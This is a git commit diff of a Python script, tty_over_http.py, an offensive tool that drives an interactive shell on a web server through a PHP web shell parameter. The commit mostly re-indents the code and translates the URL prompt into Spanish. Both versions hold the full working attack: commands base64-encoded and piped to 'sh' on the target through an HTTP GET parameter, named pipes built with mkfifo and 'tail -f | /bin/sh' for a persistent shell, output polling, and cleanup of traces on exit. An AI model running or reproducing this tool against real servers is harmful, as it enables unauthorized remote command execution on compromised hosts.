59a878b4c0cbf587159ef90071ef7d26000bc5d1
jaumesaa <91480309+jaumesaa@users.noreply.github.com>
2024-05-28 23:29:56 +0200

    completed

--- tty_over_http.py
+++ tty_over_http.py
@@ -5,39 +5,39 @@ from base64 import b64encode
 from random import randrange
 
 class AllTheReads(object):
-	def __init__(self, interval=1):
-		self.interval = interval
-		thread = threading.Thread(target=self.run, args=())
-		thread.daemon = True
-		thread.start()
+        def __init__(self, interval=1):
+                self.interval = interval
+                thread = threading.Thread(target=self.run, args=())
+                thread.daemon = True
+                thread.start()
 
-	def run(self):
-		readoutput = """/bin/cat %s""" % (stdout)
-		clearoutput = """echo '' > %s""" % (stdout)
-		while True:
-			output = RunCmd(readoutput)
-			if output:
-				RunCmd(clearoutput)
-				print(output)
-			time.sleep(self.interval)
+        def run(self):
+                readoutput = """/bin/cat %s""" % (stdout)
+                clearoutput = """echo '' > %s""" % (stdout)
+                while True:
+                        output = RunCmd(readoutput)
+                        if output:
+                                RunCmd(clearoutput)
+                                print(output)
+                        time.sleep(self.interval)
 
 def RunCmd(cmd):
-	cmd = cmd.encode('utf-8')
-	cmd = b64encode(cmd).decode('utf-8')
-	payload = {
-        	param_name : 'echo "%s" | base64 -d | sh' %(cmd)
-		}
-	result = (requests.get(url, params=payload, timeout=5).text).strip()
-	return result
+        cmd = cmd.encode('utf-8')
+        cmd = b64encode(cmd).decode('utf-8')
+        payload = {
+                param_name : 'echo "%s" | base64 -d | sh' %(cmd)
+                }
+        result = (requests.get(url, params=payload, timeout=5).text).strip()
+        return result
 
 def WriteCmd(cmd):
-	cmd = cmd.encode('utf-8')
-	cmd = b64encode(cmd).decode('utf-8')
-	payload = {
-		param_name : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
-	}
-	result = (requests.get(url, params=payload, timeout=5).text).strip()
-	return result
+        cmd = cmd.encode('utf-8')
+        cmd = b64encode(cmd).decode('utf-8')
+        payload = {
+                param_name : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
+        }
+        result = (requests.get(url, params=payload, timeout=5).text).strip()
+        return result
 
 def ReadCmd():
         GetOutput = """/bin/cat %s""" % (stdout)
@@ -45,14 +45,14 @@ def ReadCmd():
         return output
 
 def SetupShell():
-	NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
-	try:
-		RunCmd(NamedPipes)
-	except:
-		None
-	return None
+        NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
+        try:
+                RunCmd(NamedPipes)
+        except:
+                None
+        return None
 
-url = input("Url: ")
+url = input("Url con http(s) y .php: ")
 param_name = input("Nombre del parámetro: ")
 global stdin, stdout
 session = randrange(1000, 9999)
@@ -66,16 +66,16 @@ SetupShell()
 ReadingTheThings = AllTheReads()
 
 def sig_handler(sig, frame):
-	print("\n\n[*] Exiting...\n")
-	print("[*] Removing files...\n")
-	RunCmd(erasestdin)
-	RunCmd(erasestdout)
-	print("[*] All files have been deleted\n")
-	sys.exit(0)
+        print("\n\n[*] Exiting...\n")
+        print("[*] Removing files...\n")
+        RunCmd(erasestdin)
+        RunCmd(erasestdout)
+        print("[*] All files have been deleted\n")
+        sys.exit(0)
 
 signal.signal(signal.SIGINT, sig_handler)
 
 while True:
-	cmd = input("> ")
-	WriteCmd(cmd + "\n")
-	time.sleep(1.1)
+        cmd = input("> ")
+        WriteCmd(cmd + "\n")
+        time.sleep(1.1)
